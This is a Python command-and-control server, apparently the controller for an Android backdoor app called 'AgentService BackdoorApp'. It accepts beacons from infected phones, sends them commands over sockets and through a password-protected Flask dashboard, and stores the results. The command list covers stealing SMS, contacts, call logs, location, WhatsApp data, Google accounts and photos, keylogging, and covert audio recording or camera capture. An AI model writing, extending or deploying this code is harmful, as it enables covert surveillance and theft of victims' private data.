#!/usr/bin/env python3
"""
LazyFramework C2 Server - Flask + Socket
Kompatibel dengan AgentService BackdoorApp
"""

import socket
import json
import threading
import logging
import sqlite3
import datetime
from flask import Flask, render_template, request, jsonify, session
from flask_cors import CORS
import secrets
import hashlib
from config import C2_HOST, C2_PORT, DATABASE, SECRET_KEY, ADMIN_PASSWORD
from database import init_db, save_agent, save_command, save_result, get_agents, get_commands, get_results
import queue

# ==================== LOGGING ====================
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler('c2.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ==================== FLASK APP ====================
app = Flask(__name__)
app.secret_key = SECRET_KEY
CORS(app)

# ==================== GLOBAL STATE ====================
agents = {}  # {agent_id: agent_socket_handler}
command_queue = queue.Queue()  # Queue untuk commands ke agents
lock = threading.Lock()

# ==================== AGENT HANDLER CLASS ====================
class AgentHandler(threading.Thread):
    """Handle komunikasi dengan individual agent"""
    
    def __init__(self, client_socket, client_address):
        super().__init__(daemon=True)
        self.socket = client_socket
        self.address = client_address
        self.agent_id = None
        self.device_info = {}
        self.connected = True
        self.last_seen = datetime.datetime.now()
        
    def send_command(self, command_data):
        """Send command ke agent"""
        try:
            if isinstance(command_data, dict):
                command_str = json.dumps(command_data)
            else:
                command_str = command_data
            
            self.socket.sendall((command_str + '\n').encode('utf-8'))
            logger.info(f"📤 Command sent to {self.agent_id}: {command_data}")
            return True
        except Exception as e:
            logger.error(f"❌ Send error to {self.agent_id}: {e}")
            self.connected = False
            return False
    
    def recv_data(self):
        """Receive data dari agent"""
        try:
            data = b''
            while True:
                chunk = self.socket.recv(4096)
                if not chunk:
                    return None
                data += chunk
                if b'\n' in data:
                    break
            
            return data.decode('utf-8', errors='ignore').strip()
        except socket.timeout:
            return None
        except Exception as e:
            logger.error(f"❌ Recv error from {self.agent_id}: {e}")
            return None
    
    def handle_beacon(self, beacon_data):
        """Handle beacon dari agent"""
        try:
            self.agent_id = beacon_data.get('id')
            self.device_info = {
                'device': beacon_data.get('device'),
                'android': beacon_data.get('android'),
                'manufacturer': beacon_data.get('manufacturer'),
                'timestamp': beacon_data.get('timestamp')
            }
            self.last_seen = datetime.datetime.now()
            
            # Save to database
            save_agent(
                agent_id=self.agent_id,
                device=self.device_info.get('device'),
                android_version=self.device_info.get('android'),
                manufacturer=self.device_info.get('manufacturer'),
                last_seen=self.last_seen
            )
            
            with lock:
                agents[self.agent_id] = self
            
            logger.info(f"✅ Agent connected: {self.agent_id} ({self.device_info.get('device')})")
            
        except Exception as e:
            logger.error(f"❌ Beacon error: {e}")
    
    def handle_response(self, response_data):
        """Handle response dari agent"""
        try:
            command = response_data.get('command')
            agent_id = response_data.get('agent_id')
            result = response_data.get('result')
            timestamp = response_data.get('timestamp')
            command_id = response_data.get('command_id')
            
            # Save to database
            save_result(
                agent_id=agent_id,
                command=command,
                result=json.dumps(result) if isinstance(result, dict) else result,
                command_id=command_id,
                timestamp=timestamp
            )
            
            self.last_seen = datetime.datetime.now()
            logger.info(f"📥 Result received from {agent_id}: {command}")
            
            # Log ke console
            if isinstance(result, dict):
                logger.info(f"   Status: {result.get('status')}")
                if result.get('data'):
                    logger.info(f"   Data count: {result.get('count', 'N/A')}")
            
        except Exception as e:
            logger.error(f"❌ Response error: {e}")
    
    def run(self):
        """Main thread loop - listen untuk data dari agent"""
        self.socket.settimeout(60)  # 60 detik timeout
        
        try:
            while self.connected:
                data = self.recv_data()
                
                if data is None:
                    logger.warning(f"⚠️  No data from {self.agent_id}, disconnecting")
                    break
                
                if not data:
                    continue
                
                try:
                    msg = json.loads(data)
                    msg_type = msg.get('type')
                    
                    if msg_type == 'beacon':
                        self.handle_beacon(msg)
                    elif msg_type == 'response':
                        self.handle_response(msg)
                    elif msg_type == 'PONG':
                        logger.debug(f"🏓 PONG from {self.agent_id}")
                        self.last_seen = datetime.datetime.now()
                    else:
                        logger.warning(f"⚠️  Unknown message type: {msg_type}")
                        
                except json.JSONDecodeError as e:
                    logger.warning(f"❌ JSON decode error: {data[:100]}")
                    
        except Exception as e:
            logger.error(f"❌ Handler error for {self.agent_id}: {e}")
        finally:
            self.disconnect()
    
    def disconnect(self):
        """Disconnect agent"""
        try:
            self.connected = False
            self.socket.close()
            if self.agent_id in agents:
                with lock:
                    del agents[self.agent_id]
            logger.info(f"🔌 Agent disconnected: {self.agent_id}")
        except Exception as e:
            logger.error(f"❌ Disconnect error: {e}")

# ==================== SOCKET SERVER ====================
def socket_server():
    """Run socket server untuk menerima connections dari agents"""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server_socket.bind((C2_HOST, C2_PORT))
        server_socket.listen(5)
        logger.info(f"🚀 Socket server listening on {C2_HOST}:{C2_PORT}")
        
        while True:
            try:
                client_socket, client_address = server_socket.accept()
                logger.info(f"🔗 New connection from {client_address}")
                
                handler = AgentHandler(client_socket, client_address)
                handler.start()
                
            except Exception as e:
                logger.error(f"❌ Accept error: {e}")
                
    except Exception as e:
        logger.error(f"❌ Socket server error: {e}")
    finally:
        server_socket.close()

# ==================== COMMAND SENDER THREAD ====================
def command_sender():
    """Thread untuk send pending commands ke agents"""
    while True:
        try:
            # Check database untuk pending commands
            pending = get_commands(status='pending', limit=10)
            
            for cmd in pending:
                agent_id = cmd['agent_id']
                
                with lock:
                    if agent_id in agents:
                        agent_handler = agents[agent_id]
                        
                        # Build command JSON
                        command_data = {
                            'id': cmd['id'],
                            'command': cmd['command'],
                            'timestamp': datetime.datetime.now().isoformat()
                        }
                        
                        # Send command
                        if agent_handler.send_command(command_data):
                            # Update status di DB
                            save_command(cmd['id'], status='sent')
                        else:
                            logger.warning(f"⚠️  Agent {agent_id} not responding")
            
            threading.Event().wait(1)  # Check every 1 second
            
        except Exception as e:
            logger.error(f"❌ Command sender error: {e}")
            threading.Event().wait(5)

# ==================== FLASK ROUTES ====================

@app.route('/')
def index():
    """Dashboard homepage"""
    if 'username' not in session:
        return render_template('login.html')
    
    agents_list = get_agents()
    return render_template('dashboard.html', agents=agents_list)

@app.route('/login', methods=['POST'])
def login():
    """Login endpoint"""
    data = request.get_json()
    password = data.get('password', '')
    
    # Simple password auth
    if hashlib.sha256(password.encode()).hexdigest() == hashlib.sha256(ADMIN_PASSWORD.encode()).hexdigest():
        session['username'] = 'admin'
        session.permanent = True
        return jsonify({'status': 'success'})
    else:
        return jsonify({'status': 'error', 'message': 'Invalid password'}), 401

@app.route('/logout')
def logout():
    """Logout endpoint"""
    session.clear()
    return jsonify({'status': 'success'})

@app.route('/api/agents')
def api_agents():
    """Get all connected agents"""
    agents_list = []
    with lock:
        for agent_id, handler in agents.items():
            agents_list.append({
                'agent_id': agent_id,
                'device': handler.device_info.get('device'),
                'android': handler.device_info.get('android'),
                'manufacturer': handler.device_info.get('manufacturer'),
                'last_seen': handler.last_seen.isoformat(),
                'online': handler.connected
            })
    
    return jsonify(agents_list)

@app.route('/api/agent/<agent_id>')
def api_agent_detail(agent_id):
    """Get agent detail"""
    agent_data = None
    
    with lock:
        if agent_id in agents:
            handler = agents[agent_id]
            agent_data = {
                'agent_id': agent_id,
                'device': handler.device_info.get('device'),
                'android': handler.device_info.get('android'),
                'manufacturer': handler.device_info.get('manufacturer'),
                'last_seen': handler.last_seen.isoformat(),
                'online': handler.connected
            }
    
    if agent_data:
        return jsonify(agent_data)
    else:
        return jsonify({'error': 'Agent not found'}), 404

@app.route('/api/command', methods=['POST'])
def api_command():
    """Send command ke agent"""
    data = request.get_json()
    agent_id = data.get('agent_id')
    command = data.get('command')
    
    if not agent_id or not command:
        return jsonify({'error': 'Missing agent_id or command'}), 400
    
    # Save command to database
    cmd_id = save_command(agent_id=agent_id, command=command, status='pending')
    
    # Try to send immediately
    with lock:
        if agent_id in agents:
            handler = agents[agent_id]
            command_data = {
                'id': cmd_id,
                'command': command,
                'timestamp': datetime.datetime.now().isoformat()
            }
            
            if handler.send_command(command_data):
                save_command(cmd_id, status='sent')
                return jsonify({'status': 'success', 'command_id': cmd_id, 'sent': True})
            else:
                return jsonify({'status': 'error', 'message': 'Failed to send command'}), 500
    
    return jsonify({'status': 'success', 'command_id': cmd_id, 'sent': False, 'message': 'Pending'})

@app.route('/api/results/<agent_id>')
def api_results(agent_id):
    """Get results dari agent"""
    limit = request.args.get('limit', 20, type=int)
    results = get_results(agent_id=agent_id, limit=limit)
    
    return jsonify(results)

@app.route('/api/ping/<agent_id>', methods=['POST'])
def api_ping(agent_id):
    """Send PING ke agent"""
    with lock:
        if agent_id in agents:
            handler = agents[agent_id]
            if handler.socket:
                try:
                    handler.socket.sendall(b'PING\n')
                    return jsonify({'status': 'success'})
                except Exception as e:
                    return jsonify({'error': str(e)}), 500
    
    return jsonify({'error': 'Agent not found'}), 404

# ==================== HELPER ROUTES ====================

@app.route('/api/status')
def api_status():
    """Get C2 server status"""
    with lock:
        agent_count = len(agents)
    
    return jsonify({
        'status': 'online',
        'agents_connected': agent_count,
        'timestamp': datetime.datetime.now().isoformat()
    })

@app.route('/api/help')
def api_help():
    """Get available commands"""
    commands = [
        "GET_DEVICE_INFO",
        "GET_LOCATION",
        "GET_CLIPBOARD",
        "GET_INSTALLED_APPS",
        "GET_CONTACTS",
        "GET_SMS",
        "GET_CALL_LOGS",
        "GET_GALLERY",
        "GET_FILES_LIST",
        "RECORD_AUDIO",
        "STOP_RECORDING",
        "KEYLOG_START",
        "KEYLOG_STOP",
        "KEYLOG_DUMP",
        "WA_INFO",
        "WA_CONTACTS",
        "GET_ACCOUNTS",
        "GET_GOOGLE_ACCOUNTS",
        "SHOW_TOAST",
        "TAKE_PHOTO",
        "TAKE_PHOTO_FRONT",
        "TAKE_PHOTO_BACK",
        "HELP"
    ]
    
    return jsonify({
        'commands': commands,
        'count': len(commands)
    })

# ==================== ERROR HANDLERS ====================

@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Not found'}), 404

@app.errorhandler(500)
def server_error(error):
    return jsonify({'error': 'Server error'}), 500

# ==================== MAIN ====================

if __name__ == '__main__':
    # Initialize database
    init_db()
    
    # Start socket server thread
    socket_thread = threading.Thread(target=socket_server, daemon=True)
    socket_thread.start()
    
    # Start command sender thread
    sender_thread = threading.Thread(target=command_sender, daemon=True)
    sender_thread.start()
    
    logger.info("🚀 LazyFramework C2 Server Starting")
    
    # Run Flask app
    app.run(
        host='0.0.0.0',
        port=5000,
        debug=False,
        threaded=True,
        use_reloader=False
    )
